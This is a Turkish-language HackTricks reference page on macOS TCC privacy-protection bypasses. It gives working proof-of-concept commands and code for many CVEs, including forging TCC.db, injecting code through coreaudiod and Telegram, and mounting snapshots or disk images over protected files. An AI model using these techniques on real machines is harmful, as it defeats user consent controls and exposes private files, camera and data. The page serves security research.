# macOS TCC Bypass'ları

{{#include ../../../../../banners/hacktricks-training.md}}

## İşlevselliğe Göre

### Yazma Bypass'ı

Bu bir bypass değil, TCC'nin nasıl çalıştığıdır: **Yazmayı korumaz**. Eğer Terminal **bir kullanıcının Masaüstünü okumak için erişime sahip değilse, yine de oraya yazabilir**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
**Genişletilmiş özellik `com.apple.macl`**, yeni **dosyaya** eklenir ve **yaratıcı uygulama**'nın onu okuma erişimi olmasını sağlar.

### TCC ClickJacking

Kullanıcının **bunu fark etmeden kabul etmesi için TCC isteminin üzerine bir pencere koymak** mümkündür. Bir PoC'yi [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**'de bulabilirsiniz.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC İsteği rastgele isimle

Saldırgan, **`Info.plist`** dosyasında **herhangi bir isimle uygulama oluşturabilir** (örneğin Finder, Google Chrome...) ve bunu bazı TCC korumalı konumlara erişim istemesi için ayarlayabilir. Kullanıcı, bu erişimi talep edenin meşru uygulama olduğunu düşünecektir.\
Ayrıca, **meşru uygulamayı Dock'tan kaldırmak ve sahte olanı yerleştirmek** mümkündür, böylece kullanıcı sahte olanı tıkladığında (aynı simgeyi kullanabilir) meşru olanı çağırabilir, TCC izinleri isteyebilir ve bir kötü amaçlı yazılım çalıştırabilir, bu da kullanıcının meşru uygulamanın erişim talep ettiğine inanmasına neden olur.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Daha fazla bilgi ve PoC için:

{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Varsayılan olarak, **SSH üzerinden erişim "Tam Disk Erişimi"** gerektiriyordu. Bunu devre dışı bırakmak için, listede yer alması ancak devre dışı bırakılması gerekir (listeden kaldırmak bu ayrıcalıkları kaldırmaz):

![](<../../../../../images/image (1077).png>)

Bazı **kötü amaçlı yazılımların bu korumayı nasıl aştığına dair örnekler bulabilirsiniz**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Artık SSH'yi etkinleştirmek için **Tam Disk Erişimi** gerektiğini unutmayın.

### Handle extensions - CVE-2022-26767

**`com.apple.macl`** özelliği, dosyalara **belirli bir uygulamanın okuma izni vermek için** verilir. Bu özellik, bir dosyayı bir uygulamanın üzerine **sürükleyip bıraktığınızda** veya bir kullanıcı bir dosyayı **çift tıkladığında** varsayılan uygulama ile açmak için ayarlanır.

Bu nedenle, bir kullanıcı **tüm uzantıları işlemek için kötü amaçlı bir uygulama kaydedebilir** ve herhangi bir dosyayı **açmak için** Launch Services'i çağırabilir (böylece kötü amaçlı dosya okuma erişimi alacaktır).

### iCloud

**`com.apple.private.icloud-account-access`** yetkisi ile **`com.apple.iCloudHelper`** XPC servisi ile iletişim kurmak mümkündür, bu da **iCloud token'ları** sağlayacaktır.

**iMovie** ve **Garageband** bu yetkiye sahipti ve diğerleri de izin verdi.

Bu yetkiden **icloud token'ları almak için** istismara dair daha fazla **bilgi** için konuşmayı kontrol edin: [**#OBTS v5.0: "What Happens on your Mac, Stays on Apple's iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automation

**`kTCCServiceAppleEvents`** iznine sahip bir uygulama, **diğer Uygulamaları kontrol edebilecektir**. Bu, diğer Uygulamalara verilen izinleri **istismar edebileceği** anlamına gelir.

Apple Script'leri hakkında daha fazla bilgi için kontrol edin:

{{#ref}}
macos-apple-scripts.md
{{#endref}}

Örneğin, bir Uygulama **`iTerm`** üzerinde **Otomasyon iznine** sahipse, bu örnekte **`Terminal`** iTerm üzerinde erişime sahiptir:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### iTerm Üzerinde

FDA'ya sahip olmayan Terminal, iTerm'i çağırabilir, bu da ona sahip ve eylemleri gerçekleştirmek için kullanılabilir:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Finder Üzerinden

Ya da bir Uygulama Finder üzerinde erişime sahipse, bu gibi bir script olabilir:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Uygulama davranışına göre

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Kullanıcı alanındaki **tccd daemon** **`HOME`** **env** değişkenini **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`** adresinden TCC kullanıcı veritabanına erişmek için kullanıyor.

[Tam bu Stack Exchange gönderisine](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) göre ve TCC daemon'u mevcut kullanıcının alanında `launchd` aracılığıyla çalıştığı için, ona iletilen **tüm ortam değişkenlerini kontrol etmek** mümkündür.\
Bu nedenle, bir **saldırgan `$HOME` ortam** değişkenini **`launchctl`** içinde **kontrol edilen** bir **dizine** işaret edecek şekilde ayarlayabilir, **TCC** daemon'unu **yeniden başlatabilir** ve ardından **TCC veritabanını doğrudan değiştirebilir** ve kendisine **mevcut tüm TCC yetkilerini** verebilir, son kullanıcıyı asla uyarmadan.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Notlar

Notlar TCC korumalı konumlara erişime sahipti ancak bir not oluşturulduğunda bu **korumasız bir konumda oluşturuluyor**. Bu nedenle, notlardan korumalı bir dosyayı bir notta (yani korumasız bir konumda) kopyalamasını isteyebilir ve ardından dosyaya erişebilirsiniz:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translokasyon

`/usr/libexec/lsd` ikili dosyası, **nullfs** montajını oluşturmasına izin veren `com.apple.private.nullfs_allow` yetkisine sahipti ve her dosyaya erişim için **`kTCCServiceSystemPolicyAllFiles`** ile `com.apple.private.tcc.allow` yetkisine sahipti.

"Library" üzerine karantina niteliği eklemek, **`com.apple.security.translocation`** XPC hizmetini çağırmak ve ardından Library'yi **`$TMPDIR/AppTranslocation/d/d/Library`** olarak eşlemek mümkündü; burada Library içindeki tüm belgeler **erişilebilir** hale geliyordu.

### CVE-2023-38571 - Müzik & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Music`** ilginç bir özelliğe sahiptir: Çalıştığında, **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** konumuna bırakılan dosyaları kullanıcının "medya kütüphanesine" **ithal** eder. Ayrıca, **`rename(a, b);`** gibi bir şey çağırır; burada `a` ve `b` şunlardır:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

Bu **`rename(a, b);`** davranışı bir **Race Condition**'a karşı savunmasızdır, çünkü `Automatically Add to Music.localized` klasörüne sahte bir **TCC.db** dosyası koymak ve ardından yeni klasör (b) oluşturulduğunda dosyayı kopyalayıp silmek ve **`~/Library/Application Support/com.apple.TCC`**'ye işaret etmek mümkündür.

### SQLITE_SQLLOG_DIR - CVE-2023-32422

Eğer **`SQLITE_SQLLOG_DIR="path/folder"`** ise, bu temelde **her açık veritabanının o yola kopyalanması** anlamına gelir. Bu CVE'de bu kontrol, **TCC veritabanını FDA ile açacak bir süreç içinde** **SQLite veritabanına yazmak** için kötüye kullanıldı ve ardından **`SQLITE_SQLLOG_DIR`** ile dosya adında bir **symlink** kullanılarak, o veritabanı **açıldığında**, kullanıcı **TCC.db** açılanla **üzerine yazıldı**.\
**Daha fazla bilgi** [**yazıda**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **ve**[ **sohbette**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

Eğer ortam değişkeni **`SQLITE_AUTO_TRACE`** ayarlanmışsa, **`libsqlite3.dylib`** kütüphanesi tüm SQL sorgularını **kaydetmeye** başlayacaktır. Birçok uygulama bu kütüphaneyi kullandığı için, tüm SQLite sorgularını kaydetmek mümkündü.

Birçok Apple uygulaması, TCC korumalı bilgilere erişmek için bu kütüphaneyi kullandı.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Bu **env değişkeni `Metal` çerçevesi tarafından kullanılır** ve çeşitli programlar için bir bağımlılıktır, en önemlisi FDA'ya sahip olan `Music` programıdır.

Aşağıdakileri ayarlamak: `MTL_DUMP_PIPELINES_TO_JSON_FILE="path/name"`. Eğer `path` geçerli bir dizinse, hata tetiklenecek ve programda neler olduğunu görmek için `fs_usage` kullanabiliriz:

- `open()` ile `path/.dat.nosyncXXXX.XXXXXX` adında bir dosya açılacak (X rastgele)
- bir veya daha fazla `write()` dosyaya içerik yazacak (bunu kontrol edemiyoruz)
- `path/.dat.nosyncXXXX.XXXXXX` `renamed()` olacak ve `path/name` olarak değiştirilecek

Bu geçici bir dosya yazımıdır, ardından **`rename(old, new)`** **güvenli değildir.**

Güvenli değildir çünkü **eski ve yeni yolları ayrı ayrı çözmesi gerekir**, bu da biraz zaman alabilir ve Race Condition'a karşı savunmasız olabilir. Daha fazla bilgi için `xnu` fonksiyonu `renameat_internal()`'a bakabilirsiniz.

> [!CAUTION]
> Yani, temelde, eğer ayrı bir klasörden yeniden adlandırma yapan ayrıcalıklı bir işlem varsa, bir RCE kazanabilir ve farklı bir dosyaya erişmesini sağlayabilirsiniz veya bu CVE'de olduğu gibi, ayrıcalıklı uygulamanın oluşturduğu dosyayı açıp bir FD saklayabilirsiniz.
>
> Eğer yeniden adlandırma, kontrol ettiğiniz bir klasöre erişirse, kaynak dosyayı değiştirdiğiniz veya ona bir FD'ye sahip olduğunuz sürece, hedef dosyayı (veya klasörü) bir symlink'e işaret edecek şekilde değiştirebilirsiniz, böylece istediğiniz zaman yazabilirsiniz.

CVE'deki saldırı buydu: Örneğin, kullanıcının `TCC.db` dosyasını üzerine yazmak için şunları yapabiliriz:

- `/Users/hacker/ourlink` oluşturup `/Users/hacker/Library/Application Support/com.apple.TCC/`'ye işaret ettirmek
- `/Users/hacker/tmp/` dizinini oluşturmak
- `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db` ayarlamak
- bu env değişkeni ile `Music` çalıştırarak hatayı tetiklemek
- `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX`'in `open()` işlemini yakalamak (X rastgele)
- burada bu dosyayı yazma için de `open()` yapıyoruz ve dosya tanımlayıcısını tutuyoruz
- `/Users/hacker/tmp` ile `/Users/hacker/ourlink`'i **bir döngü içinde atomik olarak değiştirmek**
- bunu, yarış penceresi oldukça dar olduğu için başarılı olma şansımızı artırmak için yapıyoruz, ancak yarışı kaybetmenin önemsiz bir dezavantajı var
- biraz beklemek
- şansımızı test etmek
- eğer olmadıysa, en baştan tekrar çalıştırmak

Daha fazla bilgi için [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> Şimdi, `MTL_DUMP_PIPELINES_TO_JSON_FILE` env değişkenini kullanmaya çalışırsanız, uygulamalar başlatılmaz

### Apple Remote Desktop

Root olarak bu hizmeti etkinleştirebilir ve **ARD ajanı tam disk erişimine sahip olacaktır**; bu da bir kullanıcı tarafından yeni bir **TCC kullanıcı veritabanı** kopyalamak için kötüye kullanılabilir.

## By **NFSHomeDirectory**

TCC, kullanıcının kaynaklara erişimini kontrol etmek için kullanıcının HOME klasöründe bir veritabanı kullanır **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Bu nedenle, eğer kullanıcı TCC'yi $HOME env değişkeni **farklı bir klasöre** işaret edecek şekilde yeniden başlatmayı başarırsa, kullanıcı **/Library/Application Support/com.apple.TCC/TCC.db** içinde yeni bir TCC veritabanı oluşturabilir ve TCC'yi herhangi bir uygulamaya herhangi bir TCC izni vermesi için kandırabilir.

> [!TIP]
> Apple'ın, **`NFSHomeDirectory`** niteliğindeki kullanıcının profilinde saklanan ayarı **`$HOME`** değeri için kullandığını unutmayın, bu nedenle bu değeri değiştirme iznine sahip bir uygulamayı ele geçirirseniz (**`kTCCServiceSystemPolicySysAdminFiles`**), bu seçeneği bir TCC bypass ile **silahlandırabilirsiniz**.

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

**İlk POC**, kullanıcının **HOME** klasörünü değiştirmek için [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ve [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) kullanır.

1. Hedef uygulama için bir _csreq_ blob alın.
2. Gerekli erişimle sahte bir _TCC.db_ dosyası yerleştirin ve _csreq_ blobunu ekleyin.
3. Kullanıcının Dizin Servisleri kaydını [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) ile dışa aktarın.
4. Kullanıcının ana dizinini değiştirmek için Dizin Servisleri kaydını değiştirin.
5. Değiştirilen Dizin Servisleri kaydını [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) ile içe aktarın.
6. Kullanıcının _tccd_ sürecini durdurun ve süreci yeniden başlatın.

İkinci POC, `com.apple.private.tcc.allow` ile `kTCCServiceSystemPolicySysAdminFiles` değerine sahip olan **`/usr/libexec/configd`** kullanmıştır.\
**`-t`** seçeneği ile **`configd`** çalıştırmak mümkün olduğunda, bir saldırgan **yüklemek için özel bir Bundle** belirtebilir. Bu nedenle, istismar **kullanıcının ana dizinini değiştirmek için** **`dsexport`** ve **`dsimport`** yöntemini **`configd` kod enjeksiyonu** ile değiştirmiştir.

Daha fazla bilgi için [**orijinal rapora**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/) bakabilirsiniz.

## By process injection

Bir süreç içine kod enjekte etmek ve TCC ayrıcalıklarını kötüye kullanmak için farklı teknikler vardır:

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Ayrıca, TCC'yi atlatmak için en yaygın süreç enjeksiyonu **pluginler (load library)** aracılığıyla bulunmuştur.\
Pluginler, genellikle kütüphaneler veya plist biçiminde olan ek kodlardır ve **ana uygulama tarafından yüklenir** ve onun bağlamında çalıştırılır. Bu nedenle, ana uygulama TCC kısıtlı dosyalara (verilen izinler veya haklar aracılığıyla) erişime sahipse, **özel kod da buna sahip olacaktır**.

### CVE-2020-27937 - Directory Utility

`/System/Library/CoreServices/Applications/Directory Utility.app` uygulaması **`kTCCServiceSystemPolicySysAdminFiles`** yetkisine sahipti, **`.daplug`** uzantılı pluginler yükledi ve **güçlendirilmiş** çalışma zamanına sahip değildi.

Bu CVE'yi silahlandırmak için, **`NFSHomeDirectory`** **değiştirilir** (önceki yetkiyi kötüye kullanarak) böylece kullanıcıların TCC veritabanını ele geçirebiliriz ve TCC'yi atlatabiliriz.

Daha fazla bilgi için [**orijinal rapora**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/) bakabilirsiniz.

### CVE-2020-29621 - Coreaudiod

Binary **`/usr/sbin/coreaudiod`** `com.apple.security.cs.disable-library-validation` ve `com.apple.private.tcc.manager` yetkilerine sahipti. İlk **kod enjeksiyonuna izin verirken** ikincisi **TCC'yi yönetme** erişimi sağlıyordu.

Bu binary, **/Library/Audio/Plug-Ins/HAL** klasöründen **üçüncü taraf eklentileri** yüklemeye izin veriyordu. Bu nedenle, bir eklenti yüklemek ve bu PoC ile TCC izinlerini kötüye kullanmak mümkündü:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Daha fazla bilgi için [**orijinal rapora**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/) bakın.

### Cihaz Soyutlama Katmanı (DAL) Eklentileri

Kamera akışını Core Media I/O aracılığıyla açan sistem uygulamaları (**`kTCCServiceCamera`** ile uygulamalar) `/Library/CoreMediaIO/Plug-Ins/DAL` konumunda bulunan **bu eklentileri süreçte yükler** (SIP kısıtlı değil).

Oraya sadece ortak bir **yapıcı** ile bir kütüphane depolamak **kod enjekte etmek** için işe yarayacaktır.

Birçok Apple uygulaması buna karşı savunmasızdı.

### Firefox

Firefox uygulaması `com.apple.security.cs.disable-library-validation` ve `com.apple.security.cs.allow-dyld-environment-variables` yetkilerine sahipti:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Daha fazla bilgi için [**orijinal rapora bakın**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Binary `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` **`com.apple.private.tcc.allow`** ve **`com.apple.security.get-task-allow`** yetkilerine sahipti, bu da sürece kod enjekte etmeye ve TCC ayrıcalıklarını kullanmaya olanak tanıyordu.

### CVE-2023-26818 - Telegram

Telegram **`com.apple.security.cs.allow-dyld-environment-variables`** ve **`com.apple.security.cs.disable-library-validation`** yetkilerine sahipti, bu nedenle **izinlerine erişim sağlamak** için kötüye kullanılabiliyordu, örneğin kamerayla kayıt yapmak. [**payload'ı yazımda bulabilirsiniz**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Bir kütüphaneyi yüklemek için env değişkeninin nasıl kullanılacağını not edin; bu kütüphaneyi enjekte etmek için **özel bir plist** oluşturuldu ve **`launchctl`** kullanılarak başlatıldı:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Açık çağrılarla

Sandbox içinde bile **`open`** çağrısı yapmak mümkündür.

### Terminal Scriptleri

Terminale **Tam Disk Erişimi (FDA)** vermek, en azından teknoloji insanları tarafından kullanılan bilgisayarlarda oldukça yaygındır. Ve bununla birlikte **`.terminal`** scriptlerini çağırmak mümkündür.

**`.terminal`** scriptleri, **`CommandString`** anahtarında yürütülecek komutla birlikte bu gibi plist dosyalarıdır:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
Bir uygulama, /tmp gibi bir konumda bir terminal betiği yazabilir ve bunu şu şekilde bir komutla başlatabilir:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Montaj ile

### CVE-2020-9771 - mount_apfs TCC atlatma ve ayrıcalık yükseltme

**Herhangi bir kullanıcı** (hatta ayrıcalıksız olanlar bile) bir zaman makinesi anlık görüntüsü oluşturabilir ve montajlayabilir ve bu anlık görüntünün **TÜM dosyalarına** erişebilir.\
Gerekli olan **tek ayrıcalık**, kullanılan uygulamanın (örneğin `Terminal`) **Tam Disk Erişimi** (FDA) erişimine sahip olmasıdır (`kTCCServiceSystemPolicyAllfiles`), bu da bir yönetici tarafından verilmelidir.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
Daha ayrıntılı bir açıklama [**orijinal raporda bulunabilir**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - TCC dosyasını monte etme

TCC DB dosyası korunsa bile, yeni bir TCC.db dosyasını **dizinin üzerine monte etmek** mümkündü:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Check the **full exploit** in the [**original writeup**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

As explained in the [original writeup](https://www.kandji.io/blog/macos-audit-story-part2), bu CVE `diskarbitrationd`'yi kötüye kullandı.

`DiskArbitration` framework'ündeki `DADiskMountWithArgumentsCommon` fonksiyonu güvenlik kontrollerini gerçekleştirdi. Ancak, `diskarbitrationd`'yi doğrudan çağırarak ve dolayısıyla yolda `../` öğeleri ve symlink'ler kullanarak bunu atlamak mümkündür.

Bu, bir saldırganın herhangi bir konumda, `diskarbitrationd`'nin `com.apple.private.security.storage-exempt.heritable` yetkisi nedeniyle TCC veritabanı üzerinde keyfi montajlar yapmasına olanak tanıdı.

### asr

**`/usr/sbin/asr`** aracı, TCC korumalarını atlayarak tüm diski kopyalamaya ve başka bir yerde monte etmeye izin verdi.

### Location Services

**`/var/db/locationd/clients.plist`** içinde, **konum hizmetlerine erişim izni verilen** istemcileri belirtmek için üçüncü bir TCC veritabanı bulunmaktadır.\
**`/var/db/locationd/` klasörü DMG montajından korunmamıştı** bu nedenle kendi plist'imizi monte etmek mümkündü.

## By startup apps

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## By grep

Birçok durumda dosyalar, e-postalar, telefon numaraları, mesajlar gibi hassas bilgileri korumasız konumlarda saklayacaktır (bu Apple'da bir zafiyet olarak sayılmaktadır).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Synthetic Clicks

Bu artık çalışmıyor, ama [**geçmişte çalışıyordu**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Başka bir yol [**CoreGraphics events**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) kullanarak:

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Reference

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Ways to Bypass Your macOS Privacy Mechanisms**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Against TCC - 20+ NEW Ways to Bypass Your MacOS Privacy Mechanisms**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
